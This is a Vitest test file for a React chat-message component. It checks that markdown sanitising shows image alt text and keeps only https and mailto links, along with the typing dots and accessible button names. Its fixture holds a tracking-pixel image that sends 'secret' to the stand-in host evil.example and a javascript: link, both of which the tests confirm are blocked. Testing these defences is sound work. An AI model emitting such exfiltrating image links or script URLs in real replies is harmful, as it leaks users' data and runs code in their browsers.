import { screen } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import { renderApp } from "../../test/render";
import ChatMessage from "./ChatMessage";
import { ChatBotMessageType } from "./types";

const REPLY = [
  "![tracking pixel](https://evil.example/pixel.png?d=secret)",
  "[js](javascript:alert(1)) [plain](http://insecure.example) [secure](https://grants.gov/x) [mail](mailto:help@example.org)",
].join("\n\n");

describe("ChatMessage markdown", () => {
  it("shows image alt text instead of loading images and keeps only https and mailto links", () => {
    const { container } = renderApp(
      <ChatMessage message={{ type: ChatBotMessageType.AI, content: REPLY, metadata: {} }} />
    );

    expect(container.querySelector("img")).toBeNull();
    expect(screen.getByText("tracking pixel")).toBeInTheDocument();

    const links = [...container.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["https://grants.gov/x", "mailto:help@example.org"]);
    for (const a of links) {
      expect(a).toHaveAttribute("target", "_blank");
      expect(a).toHaveAttribute("rel", "noopener noreferrer");
    }
    expect(container.textContent).toMatch(/js plain secure mail/);
    expect(container.innerHTML).not.toMatch(/javascript:|insecure\.example|evil\.example/);
  });
});

describe("ChatMessage waiting", () => {
  it("shows hidden typing dots, and no copy button, until the answer has text", () => {
    const { container } = renderApp(
      <ChatMessage message={{ type: ChatBotMessageType.AI, content: "", metadata: {} }} />
    );

    const dots = container.querySelector("[aria-hidden='true'] > span:nth-child(3)")?.parentElement;
    expect(dots?.children).toHaveLength(3);
    expect(screen.getByText("Assistant is typing")).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /Copy/ })).not.toBeInTheDocument();
  });
});

describe("ChatMessage reply", () => {
  it("names its copy and sources buttons after the reply number and starts headings at h2", () => {
    renderApp(
      <ChatMessage
        replyNumber={3}
        message={{
          type: ChatBotMessageType.AI,
          content: "# Summary\n\n## Budget\n\nText",
          metadata: { Sources: [{ title: "NOFO.pdf", uri: "s3://bucket/nofo.pdf" }] },
        }}
      />
    );

    expect(screen.getByRole("button", { name: "Copy reply 3 to clipboard" })).toBeInTheDocument();
    expect(screen.getByRole("button", { name: "Sources (1) for reply 3" })).toHaveTextContent("Sources (1)");
    expect(screen.getByRole("heading", { level: 2, name: "Summary" })).toBeInTheDocument();
    expect(screen.getByRole("heading", { level: 3, name: "Budget" })).toBeInTheDocument();
  });
});
